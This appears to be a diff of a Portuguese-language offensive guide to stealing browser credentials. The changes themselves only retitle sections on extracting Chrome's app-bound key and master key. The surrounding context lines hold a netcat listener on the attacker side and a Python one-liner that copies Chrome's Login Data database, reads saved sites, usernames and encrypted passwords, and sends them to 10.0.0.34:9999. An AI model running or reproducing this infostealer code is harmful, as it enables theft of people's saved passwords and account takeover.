@@ -262,7 +262,7 @@ nc -lvnp 9999 > chrome_passwords.txt
 python -c "import os, sqlite3, shutil, tempfile, socket; login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data'; temp_db = tempfile.mktemp(suffix='.db'); shutil.copy2(login_data, temp_db); conn = sqlite3.connect(temp_db); cursor = conn.cursor(); cursor.execute('SELECT origin_url, username_value, password_value FROM logins'); result = ''; [result := result + f'URL: {url}\nUser: {user}\nPass: {pwd.hex()}\n\n' for url, user, pwd in cursor.fetchall()]; conn.close(); os.unlink(temp_db); s = socket.socket(); s.settimeout(5); s.connect(('10.0.0.34', 9999)); s.send(result.encode() if result else b'NO_PASSWORDS_FOUND'); s.close(); print('Enviado:', len(result), 'bytes')"
 ```
 
-### 6.1. InfoStealer - Extrair senha criptografada
+### 6.1. InfoStealer - Extrair app_bound_key do navegador
 ### No shell do atacante
 ``` cmd
 nc -lvnp 9999 | tee passwords_full.json
@@ -316,7 +316,7 @@ echo     print(f'Erro envio: {e}') >> %TEMP%\final_v2.py
 python %TEMP%\final_v2.py
 ```
 
-### 6.2. InfoStealer - Extrair blob DPAPI descriptografado
+### 6.2. InfoStealer - Extrair Master Key do Navegador
 
 ### Estrair as Master Key do Navegador Chrome
 ### No shell do atacante
